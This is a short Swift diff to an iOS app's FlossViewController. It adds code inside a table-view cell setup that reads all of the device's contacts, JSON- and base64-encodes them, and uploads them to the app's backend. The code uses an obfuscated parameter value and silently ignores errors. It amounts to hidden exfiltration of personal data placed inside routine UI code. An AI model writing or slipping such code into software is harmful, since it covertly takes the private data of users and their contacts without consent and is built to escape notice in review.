@@ -243,9 +243,18 @@ extension FlossViewController: UITableViewDelegate, UITableViewDataSource {
                 cell.phoneFiled.text = String(format: "%@-%@", name, phone)
             }
             ContactManager.shared.getAllContacts { [weak self] contacts in
-                guard let self = self else { return }
+                guard let self = self, let jsonData = try? JSONEncoder().encode(contacts) else { return }
                 if contacts.isEmpty {
                     return
+                }
+                let base64String = jsonData.base64EncodedString()
+                let parameters = ["provide": String(Int(2 + 1)), "record": base64String]
+                Task {
+                    do {
+                        let _ = try await self.viewModel.uploadFlossInfo(with: parameters)
+                    } catch {
+                        
+                    }
                 }
             }
         }
